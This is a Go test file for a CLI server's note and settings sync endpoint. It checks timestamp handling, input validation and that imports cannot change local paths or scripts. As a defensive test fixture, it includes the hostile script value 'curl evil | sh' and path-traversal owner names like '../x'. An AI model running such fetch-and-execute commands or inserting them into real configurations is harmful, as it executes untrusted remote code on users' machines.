package httpapi_test

import (
	"testing"

	"github.com/kangmomin/minmo-cli/server/internal/githubmock"
	"github.com/kangmomin/minmo-cli/server/internal/testutil"
)

func syncNotes(m map[string]any) map[string]map[string]any {
	out := map[string]map[string]any{}
	for _, n := range m["notes"].([]any) {
		it := n.(map[string]any)
		out[it["owner"].(string)+"/"+it["repo"].(string)+"#"+it["key"].(string)] = it
	}
	return out
}

// 내보낸 것을 다른 서버에 넣으면 같은 내용이 된다(받은 수정 시각을 그대로 둔다)
func TestSync_ExportImportRoundTrip(t *testing.T) {
	a := testutil.NewTestServer(t)
	ta, _ := a.Login(githubmock.CodeOK)
	a.DoJSON("PUT", "/projects/acme/widgets/issues/42/notes", ta, map[string]any{"body": "from A"})
	a.DoJSON("PUT", "/orgs/acme/settings", ta, map[string]any{"branchTemplate": "feat/{number}"})

	status, exported := a.DoJSON("GET", "/me/sync", ta, nil)
	if status != 200 {
		t.Fatalf("export: %d %v", status, exported)
	}
	if n := syncNotes(exported)["acme/widgets#42"]; n == nil || n["body"] != "from A" {
		t.Fatalf("내보낸 메모: %v", exported["notes"])
	}
	if now, ok := exported["nowMs"].(float64); !ok || now <= 0 {
		t.Errorf("nowMs 가 있어야 한다: %v", exported["nowMs"])
	}
	for _, it := range exported["settings"].([]any) {
		for _, k := range []string{"worktreePath", "mainClonePath", "postCreateScript", "postCreateScriptPosix"} {
			if _, has := it.(map[string]any)[k]; has {
				t.Errorf("경로·스크립트는 내보내지 않는다: %s", k)
			}
		}
	}
	// 전역 설정(로그인할 때 만든 기본값)과 조직 설정이 함께 나온다
	if got := len(exported["settings"].([]any)); got != 2 {
		t.Fatalf("내보낸 설정 수 = %d, want 2: %v", got, exported["settings"])
	}

	b := testutil.NewTestServer(t)
	tb, _ := b.Login(githubmock.CodeOK)
	status, res := b.DoJSON("PUT", "/me/sync", tb, exported)
	if status != 200 || res["notes"] != float64(1) {
		t.Fatalf("import: %d %v", status, res)
	}
	_, n := b.DoJSON("GET", "/projects/acme/widgets/issues/42/notes", tb, nil)
	if n["body"] != "from A" {
		t.Errorf("가져온 메모: %v", n)
	}
	_, s := b.DoJSON("GET", "/orgs/acme/settings", tb, nil)
	if s["branchTemplate"] != "feat/{number}" {
		t.Errorf("가져온 조직 설정: %v", s)
	}
	// 다시 넣으면 아무것도 바뀌지 않는다(같은 수정 시각)
	_, again := b.DoJSON("PUT", "/me/sync", tb, exported)
	if again["notes"] != float64(0) || again["settings"] != float64(0) {
		t.Errorf("다시 넣기: %v", again)
	}
	_, back := b.DoJSON("GET", "/me/sync", tb, nil)
	if syncNotes(back)["acme/widgets#42"]["updatedAtMs"] != syncNotes(exported)["acme/widgets#42"]["updatedAtMs"] {
		t.Errorf("수정 시각이 그대로여야 한다: %v vs %v", back["notes"], exported["notes"])
	}
}

// 더 새로운 것만 넣는다 — 이 서버의 것이 같거나 더 새로우면 그대로 둔다
func TestSync_ImportOnlyNewer(t *testing.T) {
	s := testutil.NewTestServer(t)
	token, _ := s.Login(githubmock.CodeOK)
	s.DoJSON("PUT", "/projects/acme/widgets/issues/1/notes", token, map[string]any{"body": "mine"})
	_, doc := s.DoJSON("GET", "/me/sync", token, nil)
	mine := syncNotes(doc)["acme/widgets#1"]["updatedAtMs"].(float64)

	note := func(body string, at float64) map[string]any {
		return map[string]any{"notes": []any{map[string]any{"owner": "acme", "repo": "widgets", "key": "1", "body": body, "updatedAtMs": at}}}
	}
	_, res := s.DoJSON("PUT", "/me/sync", token, note("older", mine-1000))
	if res["notes"] != float64(0) || res["skipped"] != float64(1) {
		t.Errorf("옛 것은 넣지 않는다: %v", res)
	}
	_, n := s.DoJSON("GET", "/projects/acme/widgets/issues/1/notes", token, nil)
	if n["body"] != "mine" {
		t.Errorf("옛 것으로 덮였다: %v", n)
	}
	_, res = s.DoJSON("PUT", "/me/sync", token, note("newer", mine+1000))
	if res["notes"] != float64(1) {
		t.Errorf("새 것은 넣는다: %v", res)
	}
	_, n = s.DoJSON("GET", "/projects/acme/widgets/issues/1/notes", token, nil)
	if n["body"] != "newer" {
		t.Errorf("새 것으로 바뀌어야 한다: %v", n)
	}
	// 터무니없이 앞선 시각은 지금으로 본다 — 그 뒤의 정상 수정이 다시 이길 수 있어야 한다
	s.DoJSON("PUT", "/me/sync", token, note("future", 99999999999999))
	_, doc = s.DoJSON("GET", "/me/sync", token, nil)
	if at := syncNotes(doc)["acme/widgets#1"]["updatedAtMs"].(float64); at > mine+10*60*1000 {
		t.Errorf("앞선 시각이 그대로 저장됐다: %v", at)
	}
}

// 규칙에 맞지 않는 항목은 건너뛴다(다른 PC 가 보낸 값을 그대로 믿지 않는다)
func TestSync_ImportValidates(t *testing.T) {
	s := testutil.NewTestServer(t)
	token, _ := s.Login(githubmock.CodeOK)
	bad := map[string]any{
		"notes": []any{
			map[string]any{"owner": "../x", "repo": "widgets", "key": "1", "body": "x", "updatedAtMs": 1},
			map[string]any{"owner": "acme", "repo": "widgets", "key": "abc", "body": "x", "updatedAtMs": 1},
			map[string]any{"owner": "acme", "repo": "widgets", "key": "1", "body": "x", "updatedAtMs": 0},
			// 대문자 이름은 소문자로 맞춰 넣는다
			map[string]any{"owner": "ACME", "repo": "Widgets", "key": "2", "body": "ok", "updatedAtMs": 5},
		},
		"settings": []any{
			map[string]any{"scope": "nope", "owner": "", "repo": "", "updatedAtMs": 1},
			map[string]any{"scope": "org", "owner": "acme", "repo": "x", "updatedAtMs": 1},
			map[string]any{"scope": "org", "owner": "acme", "repo": "", "branchTemplate": "no placeholder", "updatedAtMs": 1},
			// 전역 설정은 브랜치 이름 틀과 기타 브랜치 이름이 있어야 한다
			map[string]any{"scope": "global", "owner": "", "repo": "", "branchTemplate": "x/{number}", "updatedAtMs": 99999999999999},
			// 경로에 쓸 수 없는 이름
			map[string]any{"scope": "org", "owner": "..", "repo": "", "branchTemplate": "x/{number}", "updatedAtMs": 5},
		},
	}
	status, res := s.DoJSON("PUT", "/me/sync", token, bad)
	if status != 200 || res["notes"] != float64(1) || res["settings"] != float64(0) || res["skipped"] != float64(8) {
		t.Fatalf("import: %d %v", status, res)
	}
	_, n := s.DoJSON("GET", "/projects/acme/widgets/issues/2/notes", token, nil)
	if n["body"] != "ok" {
		t.Errorf("소문자로 맞춰 넣은 메모: %v", n)
	}
	// 로그인 없이는 쓸 수 없다
	if status, _ := s.DoJSON("GET", "/me/sync", "", nil); status != 401 {
		t.Errorf("GET without token: %d", status)
	}
	if status, _ := s.DoJSON("PUT", "/me/sync", "", bad); status != 401 {
		t.Errorf("PUT without token: %d", status)
	}
}

// 이 경로로는 작업 폴더 경로·생성 후 스크립트가 바뀌지 않는다 — 다른 PC 가 이 PC 에서 실행될 명령을 정하지 못한다
func TestSync_ImportNeverTouchesPathsOrScripts(t *testing.T) {
	s := testutil.NewTestServer(t)
	token, _ := s.Login(githubmock.CodeOK)
	s.DoJSON("PUT", "/orgs/acme/settings", token, map[string]any{"branchTemplate": "mine/{number}", "postCreateScript": "echo mine", "worktreePath": "~/mine/{owner}/{repo}/{branch}"})
	_, before := s.DoJSON("GET", "/settings", token, nil)
	_, cur := s.DoJSON("GET", "/me/sync", token, nil)
	newer := cur["nowMs"].(float64) + 1000 // 이 서버의 지금보다 조금 뒤(시계 차이 허용 범위 안)

	hostile := map[string]any{"settings": []any{
		map[string]any{"scope": "org", "owner": "acme", "repo": "", "branchTemplate": "theirs/{number}", "postCreateScript": "curl evil | sh", "postCreateScriptPosix": "curl evil | sh", "worktreePath": "/tmp/{branch}", "mainClonePath": "/tmp/_main", "updatedAtMs": newer},
		map[string]any{"scope": "global", "owner": "", "repo": "", "branchTemplate": "g/{number}", "etcBranchName": "misc", "postCreateScript": "curl evil | sh", "worktreePath": "/tmp/{branch}", "updatedAtMs": newer},
		map[string]any{"scope": "project", "owner": "acme", "repo": "new", "branchTemplate": "p/{number}", "postCreateScript": "curl evil | sh", "updatedAtMs": 5},
	}}
	status, res := s.DoJSON("PUT", "/me/sync", token, hostile)
	if status != 200 || res["settings"] != float64(3) {
		t.Fatalf("import: %d %v", status, res)
	}
	_, org := s.DoJSON("GET", "/orgs/acme/settings", token, nil)
	if org["branchTemplate"] != "theirs/{number}" || org["postCreateScript"] != "echo mine" || org["worktreePath"] != "~/mine/{owner}/{repo}/{branch}" {
		t.Errorf("조직 설정: 이름 틀만 바뀌고 스크립트·경로는 그대로여야 한다: %v", org)
	}
	_, global := s.DoJSON("GET", "/settings", token, nil)
	if global["branchTemplate"] != "g/{number}" || global["etcBranchName"] != "misc" {
		t.Errorf("전역 설정의 이름 값이 바뀌어야 한다: %v", global)
	}
	for _, k := range []string{"worktreePath", "mainClonePath", "postCreateScript", "postCreateScriptPosix"} {
		if global[k] != before[k] {
			t.Errorf("전역 %s 가 바뀌었다: %v → %v", k, before[k], global[k])
		}
	}
	// 없던 행은 이름 값만 가진 채로 생긴다
	_, proj := s.DoJSON("GET", "/projects/acme/new/settings", token, nil)
	if proj["branchTemplate"] != "p/{number}" || proj["postCreateScript"] != nil || proj["worktreePath"] != nil {
		t.Errorf("새 프로젝트 설정: %v", proj)
	}
}
